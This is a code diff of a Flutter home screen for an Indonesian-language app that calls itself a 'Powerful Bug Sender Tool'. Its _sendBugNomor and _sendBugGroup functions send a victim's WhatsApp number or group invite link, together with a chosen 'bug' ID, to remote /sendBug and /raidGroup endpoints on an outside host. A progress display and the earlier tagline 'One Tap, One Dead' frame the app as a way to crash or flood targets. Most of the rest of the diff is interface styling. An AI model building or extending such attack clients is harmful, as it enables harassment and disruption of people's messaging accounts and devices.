@@ -1,25 +1,27 @@
 import 'dart:convert';
+import 'dart:ui';
 import 'package:flutter/material.dart';
 import 'package:http/http.dart' as http;
 import 'package:video_player/video_player.dart';
-import 'package:chewie/chewie.dart';
 
 class HomePage extends StatefulWidget {
+  final bool isGroup;
   final String username;
   final String password;
-  final String sessionKey;
-  final List<Map<String, dynamic>> listBug;
   final String role;
   final String expiredDate;
+  final String sessionKey;
+  final List<Map<String, dynamic>> listBug;
 
   const HomePage({
     super.key,
+    required this.isGroup,
     required this.username,
     required this.password,
-    required this.sessionKey,
-    required this.listBug,
     required this.role,
     required this.expiredDate,
+    required this.sessionKey,
+    required this.listBug,
   });
 
   @override
@@ -27,227 +29,294 @@ class HomePage extends StatefulWidget {
 }
 
 class _HomePageState extends State<HomePage> with TickerProviderStateMixin {
+  late VideoPlayerController _videoController;
   final targetController = TextEditingController();
-  late AnimationController _fadeController;
+  final linkController = TextEditingController();
+  
   late AnimationController _slideController;
   late AnimationController _pulseController;
-  late Animation<double> _fadeAnimation;
+  late AnimationController _progressController;
   late Animation<Offset> _slideAnimation;
-  late Animation<double> _pulseAnimation;
+  late Animation<double> _progressAnimation;
 
   String selectedBugId = "";
+  String _senderType = "private"; // "private" atau "public"
   bool _isSending = false;
-  String? _responseMessage;
-
-  // Tema warna hitam biru
-  final Color primaryDark = const Color(0xFF0A0E27);
-  final Color primaryBlue = const Color(0xFF1E3A8A);
-  final Color accentBlue = const Color(0xFF3B82F6);
-  final Color lightBlue = const Color(0xFF60A5FA);
-  final Color cardDark = const Color(0xFF151932);
-  final Color cardDarker = const Color(0xFF0F1330);
-  final Color successGreen = const Color(0xFF10B981);
-  final Color warningOrange = const Color(0xFFF59E0B);
-  final Color dangerRed = const Color(0xFFEF4444);
-
-  // Video Player Variables
-  late VideoPlayerController _videoController;
-  late ChewieController _chewieController;
   bool _isVideoInitialized = false;
+  
+  // Tambahan: Variabel untuk kontrol mode tombol baru
+  bool _isNomorMode = true; 
+  
+  // Progress tracking
+  int _currentStep = 0;
+  double _progress = 0.0;
+  List<String> _progressSteps = [];
+
+  // Warna Tema Purple (Sesuai Kode Asli - TIDAK DIUBAH)
+  final Color deepPurple = const Color(0xFF120000);
+  final Color mainPurple = const Color(0xFF2A0000);
+  final Color lightPurple = const Color(0xFF2A0000);
+  final Color accentPink = const Color(0xFFCCCCCC);
+  final Color bgDark = const Color(0xFF120000);
+  final Color cardPurple = const Color(0xFF1E0000);
 
   @override
   void initState() {
     super.initState();
+    
+    // Default mode berdasarkan parameter awal
+    _isNomorMode = !widget.isGroup;
 
-    _fadeController = AnimationController(
-      vsync: this,
-      duration: const Duration(milliseconds: 1000),
-    );
+    _videoController = VideoPlayerController.asset("assets/videos/landing.mp4")
+      ..initialize().then((_) {
+        setState(() => _isVideoInitialized = true);
+        _videoController.setLooping(true);
+        _videoController.setVolume(0);
+        _videoController.play();
+      });
 
     _slideController = AnimationController(
       vsync: this,
       duration: const Duration(milliseconds: 800),
-    );
+    )..forward();
+
+    _slideAnimation = Tween<Offset>(
+      begin: const Offset(0, 0.3),
+      end: Offset.zero,
+    ).animate(CurvedAnimation(
+      parent: _slideController,
+      curve: Curves.easeOutCubic,
+    ));
 
     _pulseController = AnimationController(
       vsync: this,
       duration: const Duration(milliseconds: 1500),
     )..repeat(reverse: true);
 
-    _fadeAnimation = Tween<double>(begin: 0.0, end: 1.0).animate(
-      CurvedAnimation(parent: _fadeController, curve: Curves.easeInOut),
+    _progressController = AnimationController(
+      vsync: this,
+      duration: const Duration(milliseconds: 800),
     );
 
-    _slideAnimation = Tween<Offset>(
-      begin: const Offset(0, 0.3),
-      end: Offset.zero,
-    ).animate(CurvedAnimation(parent: _slideController, curve: Curves.easeOut));
-
-    _pulseAnimation = Tween<double>(begin: 0.95, end: 1.05).animate(
-      CurvedAnimation(parent: _pulseController, curve: Curves.easeInOut),
+    _progressAnimation = Tween<double>(begin: 0.0, end: 1.0).animate(
+      CurvedAnimation(parent: _progressController, curve: Curves.easeInOut),
     );
-
-    _fadeController.forward();
-    _slideController.forward();
 
     if (widget.listBug.isNotEmpty) {
       selectedBugId = widget.listBug[0]['bug_id'];
     }
 
-    // Initialize video player from assets
-    _initializeVideoPlayer();
-  }
-
-  void _initializeVideoPlayer() {
-    _videoController = VideoPlayerController.asset(
-      'assets/videos/banner.mp4',
-    );
-
-    _videoController.initialize().then((_) {
-      setState(() {
-        _videoController.setVolume(0.1);
-        _chewieController = ChewieController(
-          videoPlayerController: _videoController,
-          autoPlay: true,
-          looping: true,
-          showControls: false,
-          autoInitialize: true,
-        );
-        _isVideoInitialized = true;
-      });
-    }).catchError((error) {
-      print("Video initialization error: $error");
-      setState(() {
-        _isVideoInitialized = false;
-      });
-    });
+    _progressSteps = [
+      "Initializing...",
+      "Connecting to server...",
+      "Validating session...",
+      "Preparing payload...",
+      "Sending bug...",
+      "Success!"
+    ];
   }
 
   @override
   void dispose() {
-    _fadeController.dispose();
+    _videoController.dispose();
     _slideController.dispose();
     _pulseController.dispose();
+    _progressController.dispose();
     targetController.dispose();
-    _videoController.dispose();
-    _chewieController.dispose();
+    linkController.dispose();
     super.dispose();
   }
 
-  String? formatPhoneNumber(String input) {
-    final cleaned = input.replaceAll(RegExp(r'[^\d+]'), '');
-    if (!cleaned.startsWith('+') || cleaned.length < 8) return null;
-    return cleaned;
+  // Simulate progress steps
+  Future<void> _updateProgress(int step) async {
+    setState(() {
+      _currentStep = step;
+      _progress = (step + 1) / _progressSteps.length;
+    });
+    
+    _progressController.reset();
+    _progressController.forward();
+    
+    await Future.delayed(const Duration(milliseconds: 600));
   }
 
-  Future<void> _sendBug() async {
-    final rawInput = targetController.text.trim();
-    final target = formatPhoneNumber(rawInput);
-    final key = widget.sessionKey;
+  // ========== SEND BUG NOMOR ==========
+  Future<void> _sendBugNomor() async {
+    final target = targetController.text.trim();
 
-    if (target == null || key.isEmpty) {
-      _showNotification("Invalid Number",
-          "Gunakan nomor internasional (misal: +62, 1, 44), bukan 08xxx.",
-          dangerRed);
+    if (target.isEmpty) {
+      _showPopup("Error", "Nomor target tidak boleh kosong!", isError: true);
       return;
     }
 
     setState(() {
       _isSending = true;
-      _responseMessage = null;
+      _currentStep = 0;
+      _progress = 0.0;
     });
 
     try {
-      final res = await http.get(Uri.parse(
-          "http://yanzoffc-private.panelwota.my.id:11396/sendBug?key=$key&target=$target&bug=$selectedBugId"));
+      // Step 1: Initializing
+      await _updateProgress(0);
+      
+      // Step 2: Connecting
+      await _updateProgress(1);
+      
+      // Step 3: Validating
+      await _updateProgress(2);
+      
+      // Step 4: Preparing
+      await _updateProgress(3);
+      
+      final url = "https://xterclose.zorryxhostz.my.id:4001/sendBug?key=${widget.sessionKey}&target=$target&bug=$selectedBugId&senderType=$_senderType";
+      
+      // Step 5: Sending
+      await _updateProgress(4);
+      final res = await http.get(Uri.parse(url));
       final data = jsonDecode(res.body);
 
+      bool isSuccess = false;
+      String msg = "";
+
       if (data["cooldown"] == true) {
-        setState(() => _responseMessage = "⏳ Cooldown: Tunggu beberapa saat.");
+        msg = "Cooldown: Tunggu ${data['wait']} detik.";
       } else if (data["valid"] == false) {
-        setState(() => _responseMessage = "❌ Key Invalid: Silakan login ulang.");
+        msg = "Sesi Invalid.";
       } else if (data["sended"] == false) {
-        setState(() => _responseMessage =
-        "⚠️ Gagal: Server sedang maintenance.");
+        msg = "Gagal: Server Maintenance.";
       } else {
-        setState(() => _responseMessage = "✅ Berhasil mengirim bug ke $target!");
-        targetController.clear();
+        isSuccess = true;
+        msg = "Bug berhasil dikirim!";
+        // Step 6: Success
+        await _updateProgress(5);
       }
-    } catch (_) {
-      setState(() =>
-      _responseMessage = "❌ Error: Terjadi kesalahan. Coba lagi.");
+
+      await Future.delayed(const Duration(milliseconds: 500));
+
+      if (isSuccess) {
+        _showPopup("Success", msg, isError: false);
+        targetController.clear();
+      } else {
+        _showPopup("Failed", msg, isError: true);
+      }
+
+    } catch (e) {
+      _showPopup("Connection Error", "Gagal menghubungi server.", isError: true);
     } finally {
       setState(() {
         _isSending = false;
+        _currentStep = 0;
+        _progress = 0.0;
       });
     }
   }
 
-  void _showNotification(String title, String msg, Color color) {
-    ScaffoldMessenger.of(context).showSnackBar(
-      SnackBar(
-        backgroundColor: Colors.transparent,
-        elevation: 0,
-        content: Container(
-          padding: const EdgeInsets.all(16),
-          decoration: BoxDecoration(
-            color: cardDarker,
-            borderRadius: BorderRadius.circular(12),
-            border: Border.all(color: color.withOpacity(0.5)),
-            boxShadow: [
-              BoxShadow(
-                color: color.withOpacity(0.3),
-                blurRadius: 8,
-                spreadRadius: 1,
-              ),
-            ],
+  // ========== SEND BUG GROUP ==========
+  Future<void> _sendBugGroup() async {
+    final link = linkController.text.trim();
+
+    if (link.isEmpty) {
+      _showPopup("Error", "Link group tidak boleh kosong!", isError: true);
+      return;
+    }
+
+    if (!link.contains("chat.whatsapp.com")) {
+      _showPopup("Invalid Link", "Link Group tidak valid!", isError: true);
+      return;
+    }
+
+    setState(() {
+      _isSending = true;
+      _currentStep = 0;
+      _progress = 0.0;
+    });
+
+    try {
+      // Step 1: Initializing
+      await _updateProgress(0);
+      
+      // Step 2: Connecting
+      await _updateProgress(1);
+      
+      // Step 3: Validating
+      await _updateProgress(2);
+      
+      // Step 4: Preparing
+      await _updateProgress(3);
+      
+      final encodedLink = Uri.encodeComponent(link);
+      final url = "https://xterclose.zorryxhostz.my.id:4001/raidGroup?key=${widget.sessionKey}&link=$encodedLink&bug=$selectedBugId&senderType=$_senderType";
+      
+      // Step 5: Sending
+      await _updateProgress(4);
+      final res = await http.get(Uri.parse(url));
+      final data = jsonDecode(res.body);
+
+      bool isSuccess = false;
+      String msg = "";
+
+      if (data["valid"] == false) {
+        msg = "Session Invalid.";
+      } else if (data["cooldown"] == true) {
+        msg = "Cooldown: Tunggu ${data['wait']} detik.";
+      } else if (data["sended"] == true) {
+        isSuccess = true;
+        msg = "Bug berhasil dikirim ke Group!";
+        // Step 6: Success
+        await _updateProgress(5);
+      } else {
+        msg = data["message"] ?? "Gagal mengirim bug.";
+      }
+
+      await Future.delayed(const Duration(milliseconds: 500));
+
+      if (isSuccess) {
+        _showPopup("Success", msg, isError: false);
+        linkController.clear();
+      } else {
+        _showPopup("Failed", msg, isError: true);
+      }
+
+    } catch (e) {
+      _showPopup("Connection Error", "Gagal menghubungi server.", isError: true);
+    } finally {
+      setState(() {
+        _isSending = false;
+        _currentStep = 0;
+        _progress = 0.0;
+      });
+    }
+  }
+
+  void _showPopup(String title, String message, {bool isError = false}) {
+    showDialog(
+      context: context,
+      builder: (_) => BackdropFilter(
+        filter: ImageFilter.blur(sigmaX: 10, sigmaY: 10),
+        child: AlertDialog(
+          backgroundColor: cardPurple.withOpacity(0.95),
+          shape: RoundedRectangleBorder(
+            borderRadius: BorderRadius.circular(20),
+            side: BorderSide(color: isError ? Colors.pinkAccent : lightPurple, width: 1.5),
           ),
-          child: Row(
+          title: Row(
             children: [
-              Container(
-                padding: const EdgeInsets.all(8),
-                decoration: BoxDecoration(
-                  color: color.withOpacity(0.2),
-                  shape: BoxShape.circle,
-                ),
-                child: Icon(
-                  color == successGreen ? Icons.check_circle :
-                  color == dangerRed ? Icons.error : Icons.info,
-                  color: color,
-                  size: 20,
-                ),
+              Icon(
+                isError ? Icons.error_outline : Icons.check_circle_outline,
+                color: isError ? Colors.pinkAccent : Colors.greenAccent
               ),
-              const SizedBox(width: 12),
-              Expanded(
-                child: Column(
-                  crossAxisAlignment: CrossAxisAlignment.start,
-                  mainAxisSize: MainAxisSize.min,
-                  children: [
-                    Text(
-                      title,
-                      style: const TextStyle(
-                        color: Colors.white,
-                        fontWeight: FontWeight.bold,
-                        fontSize: 14,
-                      ),
-                    ),
-                    const SizedBox(height: 2),
-                    Text(
-                      msg,
-                      style: TextStyle(
-                        color: Colors.white.withOpacity(0.8),
-                        fontSize: 12,
-                      ),
-                    ),
-                  ],
-                ),
-              ),
+              const SizedBox(width: 10),
+              Text(title, style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
             ],
           ),
+          content: Text(message, style: const TextStyle(color: Colors.white70)),
+          actions: [
+            TextButton(
+              onPressed: () => Navigator.pop(context),
+              child: Text("OK", style: TextStyle(color: accentPink)),
+            ),
+          ],
         ),
-        behavior: SnackBarBehavior.floating,
-        margin: const EdgeInsets.all(16),
-        duration: const Duration(seconds: 4),
       ),
     );
   }
@@ -255,218 +324,288 @@ class _HomePageState extends State<HomePage> with TickerProviderStateMixin {
   @override
   Widget build(BuildContext context) {
     return Scaffold(
-      backgroundColor: primaryDark,
-      body: FadeTransition(
-        opacity: _fadeAnimation,
-        child: SlideTransition(
-          position: _slideAnimation,
-          child: SingleChildScrollView(
-            padding: const EdgeInsets.all(16),
-            child: Column(
-              children: [
-                // Header Section
-                _buildHeaderSection(),
+      backgroundColor: bgDark,
+      body: Stack(
+        children: [
+          // BACKGROUND DIGANTI JADI HITAM PEKAT
+          Container(
+            color: Color(0xFF120000), 
+          ),
 
-                const SizedBox(height: 24),
-
-                // Video Section
-                _buildVideoSection(),
-
-                const SizedBox(height: 24),
-
-                // Control Panel
-                _buildControlPanel(),
-
-                const SizedBox(height: 24),
-
-                // Send Button
-                _buildSendButton(),
-
-                const SizedBox(height: 16),
-
-                // Response Message
-                if (_responseMessage != null) _buildResponseMessage(),
-              ],
+          // Overlay Gelap (Gradient tetap dipertahankan agar tetap estetik)
+          Container(
+            decoration: BoxDecoration(
+              gradient: LinearGradient(
+                colors: [
+                  Color(0xFF120000).withOpacity(0.8), // Sedikit transparan di atas
+                  deepPurple.withOpacity(0.8),
+                ],
+                begin: Alignment.topCenter,
+                end: Alignment.bottomCenter,
+              ),
             ),
           ),
-        ),
-      ),
-    );
-  }
 
-  Widget _buildHeaderSection() {
-    return Container(
-      width: double.infinity,
-      padding: const EdgeInsets.all(20),
-      decoration: BoxDecoration(
-        borderRadius: BorderRadius.circular(16),
-        gradient: LinearGradient(
-          colors: [primaryBlue, accentBlue],
-          begin: Alignment.topLeft,
-          end: Alignment.bottomRight,
-        ),
-        boxShadow: [
-          BoxShadow(
-            color: accentBlue.withOpacity(0.3),
-            blurRadius: 15,
-            offset: const Offset(0, 5),
-          ),
-        ],
-      ),
-      child: Column(
-        children: [
-          Row(
-            children: [
-              AnimatedBuilder(
-                animation: _pulseAnimation,
-                builder: (context, child) {
-                  return Transform.scale(
-                    scale: _pulseAnimation.value,
-                    child: Container(
-                      width: 60,
-                      height: 60,
-                      decoration: BoxDecoration(
-                        shape: BoxShape.circle,
-                        border: Border.all(color: Colors.white.withOpacity(0.3), width: 2),
-                      ),
-                      child: ClipOval(
-                        child: Image.asset(
-                          'assets/images/logo.jpg',
-                          fit: BoxFit.cover,
-                        ),
-                      ),
-                    ),
-                  );
-                },
-              ),
-              const SizedBox(width: 16),
-              Expanded(
+          // Konten Utama
+          SafeArea(
+            child: SingleChildScrollView(
+              padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 10),
+              child: SlideTransition(
+                position: _slideAnimation,
                 child: Column(
                   crossAxisAlignment: CrossAxisAlignment.start,
                   children: [
-                    Text(
-                      widget.username,
-                      style: const TextStyle(
-                        color: Colors.white,
-                        fontSize: 20,
-                        fontWeight: FontWeight.bold,
+                    _buildProfileCard(),
+                    const SizedBox(height: 20),
+                    
+                    _buildVideoBanner(),
+                    const SizedBox(height: 20),
+                    
+                    // === UPDATE: TOMBOL MODE (Tampilan Dirubah, Warna Tetap Ungu) ===
+                    _buildModeButtons(),
+                    const SizedBox(height: 20),
+                    // ======================================
+
+                    // Konten dinamis berdasarkan tombol yang dipilih
+                    if (_isNomorMode) ...[
+                      // Input Target
+                      _buildSectionTitle(Icons.phone_android, "TARGET NUMBER"),
+                      const SizedBox(height: 10),
+                      _buildTextField(
+                        controller: targetController,
+                        hint: "628xxxxxxxx",
+                        prefixIcon: Icons.phone,
                       ),
-                    ),
-                    const SizedBox(height: 4),
-                    Container(
-                      padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 4),
-                      decoration: BoxDecoration(
-                        color: Colors.white.withOpacity(0.2),
-                        borderRadius: BorderRadius.circular(12),
+                      const SizedBox(height: 25),
+                    ] else ...[
+                      // Link Group WA
+                      _buildSectionTitle(Icons.link, "LINK GROUP WA"),
+                      const SizedBox(height: 10),
+                      _buildTextField(
+                        controller: linkController,
+                        hint: "https://chat.whatsapp.com/...",
+                        prefixIcon: Icons.link,
                       ),
-                      child: Text(
-                        widget.role.toUpperCase(),
-                        style: const TextStyle(
-                          color: Colors.white,
-                          fontSize: 12,
-                          fontWeight: FontWeight.w500,
-                        ),
-                      ),
-                    ),
-                  ],
-                ),
-              ),
-              Container(
-                padding: const EdgeInsets.all(12),
-                decoration: BoxDecoration(
-                  color: Colors.white.withOpacity(0.2),
-                  borderRadius: BorderRadius.circular(12),
-                ),
-                child: Column(
-                  children: [
-                    const Text(
-                      "EXPIRES",
-                      style: TextStyle(
-                        color: Colors.white,
-                        fontSize: 10,
-                        fontWeight: FontWeight.w500,
-                      ),
-                    ),
-                    Text(
-                      widget.expiredDate,
-                      style: const TextStyle(
-                        color: Colors.white,
-                        fontSize: 12,
-                        fontWeight: FontWeight.bold,
-                      ),
+                      const SizedBox(height: 25),
+                    ],
+
+                    // Dropdown Bug (Sama untuk keduanya)
+                    _buildSectionTitle(Icons.bug_report, "PILIH BUG"),
+                    const SizedBox(height: 10),
+                    _buildDropdown(),
+                    const SizedBox(height: 30),
+
+                    // Progress Indicator
+                    if (_isSending) _buildProgressIndicator(),
+                    if (_isSending) const SizedBox(height: 30),
+
+                    // Send Button (Logic berubah sesuai mode)
+                    _buildSendButton(
+                      onPressed: _isNomorMode ? _sendBugNomor : _sendBugGroup,
+                      label: _isNomorMode ? "SEND BUG NOMOR" : "SEND BUG GROUP",
                     ),
                   ],
                 ),
               ),
-            ],
+            ),
           ),
         ],
       ),
     );
   }
 
-  Widget _buildVideoSection() {
+  // === UPDATE: WIDGET TOMBOL MODE ===
+  // Hanya tampilan layout yang disesuaikan dengan foto (lebih compact, ikon di kiri).
+  // Warna tetap menggunakan variabel tema ungu (mainPurple, lightPurple, dll).
+  Widget _buildModeButtons() {
+    return Row(
+      children: [
+        // Button BUG NOMOR (Kiri)
+        Expanded(
+          child: GestureDetector(
+            onTap: () {
+              setState(() {
+                _isNomorMode = true;
+              });
+            },
+            child: Container(
+              // Tinggi disesuaikan agar terlihat seperti tombol tool yang compact
+              height: 50, 
+              padding: const EdgeInsets.symmetric(horizontal: 12),
+              decoration: BoxDecoration(
+                // Jika aktif: warna ungu utama dengan gradient
+                // Jika pasif: transparan/gelap dengan border abu-abu
+                gradient: _isNomorMode 
+                    ? LinearGradient(colors: [mainPurple, lightPurple]) 
+                    : null,
+                color: _isNomorMode ? null : Colors.grey.shade900?.withOpacity(0.3),
+                borderRadius: BorderRadius.circular(10),
+                border: Border.all(
+                  color: _isNomorMode ? mainPurple : Colors.grey.shade700!,
+                  width: 1.5,
+                ),
+                // Efek glow halus saat aktif
+                boxShadow: _isNomorMode 
+                    ? [BoxShadow(color: mainPurple.withOpacity(0.4), blurRadius: 8, spreadRadius: 1)]
+                    : null,
+              ),
+              child: Row(
+                mainAxisAlignment: MainAxisAlignment.center,
+                children: [
+                  Icon(
+                    Icons.phone_android,
+                    // Icon putih saat aktif, abu-abu saat pasif
+                    color: _isNomorMode ? Colors.white : Colors.grey.shade600,
+                    size: 18,
+                  ),
+                  const SizedBox(width: 8),
+                  Text(
+                    "BUG NOMER", // Sesuai tulisan di foto
+                    style: TextStyle(
+                      color: _isNomorMode ? Colors.white : Colors.grey.shade600,
+                      fontWeight: FontWeight.bold,
+                      fontSize: 13,
+                      letterSpacing: 0.5,
+                    ),
+                  ),
+                ],
+              ),
+            ),
+          ),
+        ),
+        const SizedBox(width: 15),
+        // Button BUG GROUP (Kanan)
+        Expanded(
+          child: GestureDetector(
+            onTap: () {
+              setState(() {
+                _isNomorMode = false;
+              });
+            },
+            child: Container(
+              // Tinggi disesuaikan agar terlihat seperti tombol tool yang compact
+              height: 50,
+              padding: const EdgeInsets.symmetric(horizontal: 12),
+              decoration: BoxDecoration(
+                // Jika aktif: warna ungu utama dengan gradient
+                // Jika pasif: transparan/gelap dengan border abu-abu
+                gradient: !_isNomorMode 
+                    ? LinearGradient(colors: [mainPurple, lightPurple]) 
+                    : null,
+                color: !_isNomorMode ? null : Colors.grey.shade900?.withOpacity(0.3),
+                borderRadius: BorderRadius.circular(10),
+                border: Border.all(
+                  color: !_isNomorMode ? mainPurple : Colors.grey.shade700!,
+                  width: 1.5,
+                ),
+                // Efek glow halus saat aktif
+                boxShadow: !_isNomorMode 
+                    ? [BoxShadow(color: mainPurple.withOpacity(0.4), blurRadius: 8, spreadRadius: 1)]
+                    : null,
+              ),
+              child: Row(
+                mainAxisAlignment: MainAxisAlignment.center,
+                children: [
+                  Icon(
+                    Icons.group_add,
+                    // Icon putih saat aktif, abu-abu saat pasif
+                    color: !_isNomorMode ? Colors.white : Colors.grey.shade600,
+                    size: 18,
+                  ),
+                  const SizedBox(width: 8),
+                  Text(
+                    "BUG GROUP",
+                    style: TextStyle(
+                      color: !_isNomorMode ? Colors.white : Colors.grey.shade600,
+                      fontWeight: FontWeight.bold,
+                      fontSize: 13,
+                      letterSpacing: 0.5,
+                    ),
+                  ),
+                ],
+              ),
+            ),
+          ),
+        ),
+      ],
+    );
+  }
+
+  // ========== WIDGET HELPERS (TIDAK DIUBAH) ==========
+
+  Widget _buildVideoBanner() {
     return Container(
       width: double.infinity,
       height: 200,
       decoration: BoxDecoration(
-        borderRadius: BorderRadius.circular(16),
-        color: cardDark,
+        borderRadius: BorderRadius.circular(20),
+        border: Border.all(color: mainPurple.withOpacity(0.5), width: 2),
         boxShadow: [
           BoxShadow(
-            color: Colors.black.withOpacity(0.3),
-            blurRadius: 10,
-            offset: const Offset(0, 5),
-          ),
+            color: mainPurple.withOpacity(0.3),
+            blurRadius: 15,
+            spreadRadius: 2,
+          )
         ],
       ),
       child: ClipRRect(
-        borderRadius: BorderRadius.circular(16),
+        borderRadius: BorderRadius.circular(20),
         child: Stack(
+          fit: StackFit.expand,
           children: [
             if (_isVideoInitialized)
-              Chewie(controller: _chewieController)
+              FittedBox(
+                fit: BoxFit.cover,
+                child: SizedBox(
+                  width: _videoController.value.size.width,
+                  height: _videoController.value.size.height,
+                  child: VideoPlayer(_videoController),
+                ),
+              )
             else
               Container(
-                color: cardDarker,
-                child: Center(
-                  child: CircularProgressIndicator(
-                    color: accentBlue,
-                  ),
+                color: deepPurple,
+                child: const Center(
+                  child: CircularProgressIndicator(color: Colors.white),
                 ),
               ),
-            // Overlay gradient
             Container(
               decoration: BoxDecoration(
-                borderRadius: BorderRadius.circular(16),
                 gradient: LinearGradient(
                   colors: [
                     Colors.transparent,
-                    Colors.black.withOpacity(0.7),
+                    deepPurple.withOpacity(0.7),
                   ],
                   begin: Alignment.topCenter,
                   end: Alignment.bottomCenter,
                 ),
               ),
             ),
-            // Overlay text
             Positioned(
-              bottom: 16,
-              left: 16,
-              right: 16,
-              child: Text(
-                "One Tap, One Dead",
-                style: TextStyle(
-                  color: Colors.white,
-                  fontSize: 18,
-                  fontWeight: FontWeight.bold,
-                  shadows: [
-                    Shadow(
-                      color: Colors.black.withOpacity(0.5),
-                      blurRadius: 5,
+              bottom: 20,
+              left: 20,
+              right: 20,
+              child: Column(
+                crossAxisAlignment: CrossAxisAlignment.start,
+                children: [
+                  const Text(
+                    "404 VOIDX V1.3",
+                    style: TextStyle(
+                      color: Colors.white,
+                      fontWeight: FontWeight.bold,
+                      fontSize: 24,
+                      fontFamily: 'Orbitron',
                     ),
-                  ],
-                ),
+                  ),
+                  const SizedBox(height: 5),
+                  Text(
+                    "Powerful Bug Sender Tool",
+                    style: TextStyle(
+                      color: accentPink,
+                      fontSize: 14,
+                    ),
+                  ),
+                ],
               ),
             ),
           ],
@@ -475,54 +614,129 @@ class _HomePageState extends State<HomePage> with TickerProviderStateMixin {
     );
   }
 
-  Widget _buildControlPanel() {
+  Widget _buildProgressIndicator() {
     return Container(
-      width: double.infinity,
       padding: const EdgeInsets.all(20),
       decoration: BoxDecoration(
-        color: cardDark,
-        borderRadius: BorderRadius.circular(16),
+        gradient: LinearGradient(
+          colors: [cardPurple.withOpacity(0.8), deepPurple.withOpacity(0.6)],
+        ),
+        borderRadius: BorderRadius.circular(20),
+        border: Border.all(color: mainPurple.withOpacity(0.5)),
         boxShadow: [
           BoxShadow(
-            color: Colors.black.withOpacity(0.3),
-            blurRadius: 10,
-            offset: const Offset(0, 5),
-          ),
+            color: mainPurple.withOpacity(0.2),
+            blurRadius: 15,
+          )
         ],
       ),
       child: Column(
-        crossAxisAlignment: CrossAxisAlignment.start,
         children: [
-          const Text(
-            "Control Panel",
-            style: TextStyle(
-              color: Colors.white,
-              fontSize: 18,
-              fontWeight: FontWeight.bold,
-            ),
+          // Step indicator with numbers
+          Row(
+            mainAxisAlignment: MainAxisAlignment.spaceBetween,
+            children: List.generate(_progressSteps.length, (index) {
+              bool isActive = index <= _currentStep;
+              bool isCurrent = index == _currentStep;
+              
+              return Expanded(
+                child: Column(
+                  children: [
+                    Container(
+                      width: 40,
+                      height: 40,
+                      decoration: BoxDecoration(
+                        shape: BoxShape.circle,
+                        gradient: isActive
+                            ? LinearGradient(
+                                colors: [mainPurple, lightPurple],
+                              )
+                            : null,
+                        color: isActive ? null : cardPurple.withOpacity(0.5),
+                        border: Border.all(
+                          color: isCurrent ? accentPink : mainPurple.withOpacity(0.3),
+                          width: isCurrent ? 2 : 1,
+                        ),
+                        boxShadow: isCurrent
+                            ? [
+                                BoxShadow(
+                                  color: accentPink.withOpacity(0.5),
+                                  blurRadius: 10,
+                                  spreadRadius: 2,
+                                )
+                              ]
+                            : null,
+                      ),
+                      child: Center(
+                        child: isActive && index < _currentStep
+                            ? const Icon(
+                                Icons.check,
+                                color: Colors.white,
+                                size: 20,
+                              )
+                            : Text(
+                                '${index + 1}',
+                                style: TextStyle(
+                                  color: isActive ? Colors.white : Colors.grey,
+                                  fontWeight: FontWeight.bold,
+                                  fontSize: 16,
+                                ),
+                              ),
+                      ),
+                    ),
+                    if (index < _progressSteps.length - 1)
+                      Container(
+                        margin: const EdgeInsets.only(top: 5),
+                        height: 2,
+                        color: isActive ? lightPurple : cardPurple,
+                      ),
+                  ],
+                ),
+              );
+            }),
           ),
-          const SizedBox(height: 16),
-
-          // Target Input
-          _buildModernInput(
-            controller: targetController,
-            label: "Target Number",
-            hint: "e.g. +62xxxxxxxxxx",
-            icon: Icons.phone_android,
-            keyboardType: TextInputType.phone,
-          ),
-
-          const SizedBox(height: 16),
-
-          // Bug Selection
-          _buildModernDropdown(
-            label: "Select Bug",
-            value: selectedBugId,
-            items: widget.listBug,
-            onChanged: (value) {
-              setState(() {
-                selectedBugId = value!;
-              });
+          
+          const SizedBox(height: 20),
+          
+          // Animated Progress Bar
+          AnimatedBuilder(
+            animation: _progressAnimation,
+            builder: (context, child) {
+              return Column(
+                children: [
+                  ClipRRect(
+                    borderRadius: BorderRadius.circular(10),
+                    child: LinearProgressIndicator(
+                      value: _progress * _progressAnimation.value,
+                      minHeight: 10,
+                      backgroundColor: cardPurple,
+                      valueColor: AlwaysStoppedAnimation<Color>(accentPink),
+                    ),
+                  ),
+                  const SizedBox(height: 10),
+                  Row(
+                    mainAxisAlignment: MainAxisAlignment.spaceBetween,
+                    children: [
+                      Text(
+                        _progressSteps[_currentStep],
+                        style: TextStyle(
+                          color: accentPink,
+                          fontSize: 14,
+                          fontWeight: FontWeight.bold,
+                        ),
+                      ),
+                      Text(
+                        '${(_progress * 100).toInt()}%',
+                        style: const TextStyle(
+                          color: Colors.white,
+                          fontSize: 14,
+                          fontWeight: FontWeight.bold,
+                        ),
+                      ),
+                    ],
+                  ),
+                ],
+              );
             },
           ),
         ],
@@ -530,205 +744,389 @@ class _HomePageState extends State<HomePage> with TickerProviderStateMixin {
     );
   }
 
-  Widget _buildModernInput({
-    required TextEditingController controller,
-    required String label,
-    required String hint,
-    required IconData icon,
-    TextInputType? keyboardType,
-  }) {
-    return Column(
-      crossAxisAlignment: CrossAxisAlignment.start,
-      children: [
-        Text(
-          label,
-          style: const TextStyle(
-            color: Colors.white,
-            fontSize: 14,
-            fontWeight: FontWeight.w500,
-          ),
+  Widget _buildProfileCard() {
+    return Container(
+      width: double.infinity,
+      padding: const EdgeInsets.all(20),
+      decoration: BoxDecoration(
+        gradient: LinearGradient(
+          colors: [cardPurple.withOpacity(0.6), deepPurple.withOpacity(0.4)],
         ),
-        const SizedBox(height: 8),
-        Container(
-          decoration: BoxDecoration(
-            color: cardDarker,
-            borderRadius: BorderRadius.circular(12),
-            border: Border.all(color: accentBlue.withOpacity(0.3)),
-          ),
-          child: TextField(
-            controller: controller,
-            keyboardType: keyboardType,
-            style: const TextStyle(color: Colors.white),
-            decoration: InputDecoration(
-              hintText: hint,
-              hintStyle: TextStyle(color: Colors.white.withOpacity(0.5)),
-              prefixIcon: Icon(icon, color: accentBlue),
-              border: InputBorder.none,
-              contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
-            ),
-          ),
-        ),
-      ],
-    );
-  }
-
-  Widget _buildModernDropdown({
-    required String label,
-    required String value,
-    required List<Map<String, dynamic>> items,
-    required Function(String?) onChanged,
-  }) {
-    return Column(
-      crossAxisAlignment: CrossAxisAlignment.start,
-      children: [
-        Text(
-          label,
-          style: const TextStyle(
-            color: Colors.white,
-            fontSize: 14,
-            fontWeight: FontWeight.w500,
-          ),
-        ),
-        const SizedBox(height: 8),
-        Container(
-          decoration: BoxDecoration(
